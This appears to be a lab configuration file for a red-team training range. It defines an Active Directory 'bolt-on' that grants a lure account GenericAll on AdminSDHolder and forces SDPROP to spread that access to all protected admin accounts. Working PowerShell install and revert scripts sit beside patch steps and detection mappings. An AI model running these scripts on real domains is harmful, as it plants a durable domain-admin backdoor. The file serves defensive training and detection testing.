@@ -1,0 +1,267 @@
+# Bolt-on: AdminSDHolder ACL Modified
+# ------------------------------------
+# Install grants a low-priv user GenericAll on the AdminSDHolder object.
+# The SDPROP task (runs hourly by default) propagates that ACE to every
+# protected admin (Domain Admins, Enterprise Admins, Account Operators,
+# etc.) — durable persistence even if the operator is removed from the
+# privileged group.
+#
+# Patch restores the canonical AdminSDHolder ACL from a captured baseline,
+# triggers SDPROP to re-protect all sensitive accounts, and disables the
+# bolt-on lure account.
+#
+# Elastic rule UUIDs are real:
+#   Research/elastic-detection-rules/rules/windows/persistence_ad_adminsdholder.toml
+
+id: bolton.access-control.adminsdholder-acl-modified
+slug: adminsdholder-acl-modified
+name: "AdminSDHolder ACL Modified — SDPROP Backdoor"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: access-control
+subcategory: adminsdholder
+tags:
+  - active-directory
+  - persistence
+  - dacl
+  - sdprop
+  - privilege-escalation
+description: >
+  Modifies the DACL on the AdminSDHolder container
+  (CN=AdminSDHolder,CN=System,DC=...) to grant a non-privileged user
+  GenericAll. The SDPROP background task (60-minute default cadence) then
+  copies the AdminSDHolder ACL onto every adminCount=1 object — Domain
+  Admins, Enterprise Admins, Account Operators, krbtgt, etc. The lure user
+  retains full control over every protected admin object even after being
+  removed from groups, providing durable persistence per MITRE T1098 +
+  T1078.002.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1098/"
+  - "https://attack.mitre.org/techniques/T1078/002/"
+  - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory"
+  - "https://adsecurity.org/?p=1906"
+
+mitre:
+  tactic:
+    id: TA0003
+    name: "Persistence"
+  technique:
+    id: T1098
+    name: "Account Manipulation"
+  notes: >
+    Combined with T1078.002 (Valid Accounts: Domain Accounts) — the
+    backdoor is invoked via a normal Domain Users credential that
+    nonetheless wields admin-level access on protected objects.
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "6e9130a5-9be6-48e5-943a-9628bfc74b18"
+      rule_name: "AdminSDHolder Backdoor"
+      rule_filename: "windows/persistence_ad_adminsdholder.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Fires directly on Directory Service Changes (5136) targeting AdminSDHolder."
+  signal_sources:
+    - "Windows Event 5136 (Directory Service object modified — AdminSDHolder ntSecurityDescriptor)"
+    - "Windows Event 4738 (User account changed — adminCount flips on protected objects)"
+    - "Windows Event 4662 (Object access — Write Property on AdminSDHolder)"
+
+targets:
+  supported_os:
+    - family: windows
+      min_version: "2016"
+      max_version: "2025"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - domain_controller
+  required_services: []
+  required_domain_function_level: "2016"
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: true        # SDPROP propagates the ACE forest-wide
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 120
+  steps:
+    - ansible_role: community.windows.win_domain_user
+      description: "Create the lure account used as the GenericAll grantee."
+      role_vars:
+        name: "lure_persist"
+        password: "{{ lookup('community.general.random_string', length=24, special=true) }}"
+        password_never_expires: true
+        state: present
+        groups:
+          - "Domain Users"
+    - ansible_role: community.windows.win_powershell
+      description: "Capture the baseline AdminSDHolder SDDL and grant GenericAll to lure_persist."
+      role_vars:
+        script: |
+          $domDn  = (Get-ADDomain).DistinguishedName
+          $asdh   = "CN=AdminSDHolder,CN=System,$domDn"
+          $baseline = Get-Acl "AD:$asdh"
+          # Persist baseline for clean revert during patch
+          $baselinePath = "C:\ProgramData\bolton\adminsdholder-baseline.sddl"
+          New-Item -Path (Split-Path $baselinePath) -ItemType Directory -Force | Out-Null
+          $baseline.Sddl | Out-File -Encoding UTF8 -FilePath $baselinePath
+
+          $acl  = Get-Acl "AD:$asdh"
+          $sid  = (Get-ADUser 'lure_persist').SID
+          $ace  = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid, 'GenericAll', 'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All)
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$asdh" -AclObject $acl
+    - ansible_role: community.windows.win_powershell
+      description: "Trigger SDPROP immediately so the ACE propagates to all protected objects."
+      role_vars:
+        script: |
+          $rootDn = (Get-ADRootDSE).rootDomainNamingContext
+          $dc = (Get-ADDomainController -Discover -Service PrimaryDC).HostName[0]
+          # Force SDPROP via runProtectAdminGroupsTask
+          $de = [ADSI]"LDAP://$dc/$rootDn"
+          $de.Put("RunProtectAdminGroupsTask", 1)
+          $de.SetInfo()
+  verify:
+    probe: |
+      $domDn  = (Get-ADDomain).DistinguishedName
+      $asdh   = "CN=AdminSDHolder,CN=System,$domDn"
+      $acl    = Get-Acl "AD:$asdh"
+      $sid    = (Get-ADUser 'lure_persist').SID
+      $hit    = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value -and $_.ActiveDirectoryRights -match 'GenericAll' }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Strip the lure ACE from AdminSDHolder, trigger SDPROP, then delete the lure account."
+  estimated_time_seconds: 90
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Remove the bolt-on ACE from AdminSDHolder."
+      role_vars:
+        script: |
+          $domDn = (Get-ADDomain).DistinguishedName
+          $asdh  = "CN=AdminSDHolder,CN=System,$domDn"
+          $acl   = Get-Acl "AD:$asdh"
+          $sid   = (Get-ADUser 'lure_persist').SID
+          $toRemove = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value }
+          foreach ($ace in $toRemove) { [void]$acl.RemoveAccessRule($ace) }
+          Set-Acl "AD:$asdh" -AclObject $acl
+          $rootDn = (Get-ADRootDSE).rootDomainNamingContext
+          $dc = (Get-ADDomainController -Discover -Service PrimaryDC).HostName[0]
+          $de = [ADSI]"LDAP://$dc/$rootDn"
+          $de.Put("RunProtectAdminGroupsTask", 1)
+          $de.SetInfo()
+    - ansible_role: community.windows.win_domain_user
+      description: "Delete the lure account."
+      role_vars:
+        name: "lure_persist"
+        state: absent
+  verify:
+    probe: |
+      Get-ADUser -Filter "sAMAccountName -eq 'lure_persist'" |
+        Measure-Object | Select-Object -ExpandProperty Count
+    timeout_seconds: 30
+    expect_stdout_contains: "0"
+
+patch:
+  description: >
+    Restore the captured AdminSDHolder ACL baseline from
+    C:\ProgramData\bolton\adminsdholder-baseline.sddl, trigger SDPROP so
+    every protected object inherits the clean ACL, and disable the lure
+    account (kept disabled rather than deleted to surface stale tickets
+    on next 4768/4769). Tightens the audit ACL to log all future writes.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory"
+    - "https://attack.mitre.org/mitigations/M1026/"
+    - "https://adsecurity.org/?p=1906"
+  complexity: medium
+  side_effects:
+    - "AdminSDHolder DACL reset to captured baseline"
+    - "SDPROP triggered — propagation re-runs within 60s on PDC emulator"
+    - "Lure account 'lure_persist' disabled (not deleted) to expose stale tickets"
+    - "SACL extended to audit all Write Property events on AdminSDHolder going forward"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Restore the baseline ACL and disable the lure."
+      role_vars:
+        script: |
+          $domDn = (Get-ADDomain).DistinguishedName
+          $asdh  = "CN=AdminSDHolder,CN=System,$domDn"
+          $baselinePath = "C:\ProgramData\bolton\adminsdholder-baseline.sddl"
+          $sddl = Get-Content $baselinePath -Raw
+          $acl = Get-Acl "AD:$asdh"
+          $acl.SetSecurityDescriptorSddlForm($sddl)
+          Set-Acl "AD:$asdh" -AclObject $acl
+          Disable-ADAccount -Identity 'lure_persist'
+          $rootDn = (Get-ADRootDSE).rootDomainNamingContext
+          $dc = (Get-ADDomainController -Discover -Service PrimaryDC).HostName[0]
+          $de = [ADSI]"LDAP://$dc/$rootDn"
+          $de.Put("RunProtectAdminGroupsTask", 1)
+          $de.SetInfo()
+  verify:
+    probe: |
+      $domDn = (Get-ADDomain).DistinguishedName
+      $asdh  = "CN=AdminSDHolder,CN=System,$domDn"
+      $acl   = Get-Acl "AD:$asdh"
+      $sid   = (Get-ADUser 'lure_persist').SID
+      $hit   = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value }
+      $disabled = (Get-ADUser 'lure_persist' -Properties Enabled).Enabled -eq $false
+      if (-not $hit -and $disabled) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/adminsdholder_check.sh"
+
+patch_revert:
+  description: "Re-grant lure_persist GenericAll on AdminSDHolder and re-enable the account."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: community.windows.win_powershell
+      description: "Re-add the bolt-on ACE and re-enable lure."
+      role_vars:
+        script: |
+          $domDn = (Get-ADDomain).DistinguishedName
+          $asdh  = "CN=AdminSDHolder,CN=System,$domDn"
+          $acl   = Get-Acl "AD:$asdh"
+          $sid   = (Get-ADUser 'lure_persist').SID
+          $ace   = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
+            $sid, 'GenericAll', 'Allow',
+            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All)
+          $acl.AddAccessRule($ace)
+          Set-Acl "AD:$asdh" -AclObject $acl
+          Enable-ADAccount -Identity 'lure_persist'
+          $rootDn = (Get-ADRootDSE).rootDomainNamingContext
+          $dc = (Get-ADDomainController -Discover -Service PrimaryDC).HostName[0]
+          $de = [ADSI]"LDAP://$dc/$rootDn"
+          $de.Put("RunProtectAdminGroupsTask", 1)
+          $de.SetInfo()
+  verify:
+    probe: |
+      $domDn = (Get-ADDomain).DistinguishedName
+      $asdh  = "CN=AdminSDHolder,CN=System,$domDn"
+      $acl   = Get-Acl "AD:$asdh"
+      $sid   = (Get-ADUser 'lure_persist').SID
+      $hit   = $acl.Access | Where-Object { $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sid.Value }
+      if ($hit) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  warning: "lure_persist has GenericAll on AdminSDHolder again — SDPROP re-propagates within 60 minutes."
+
+cost:
+  storage_mb: 1
+  cpu_pct: 0
+  detectability: medium
+
+status: stable
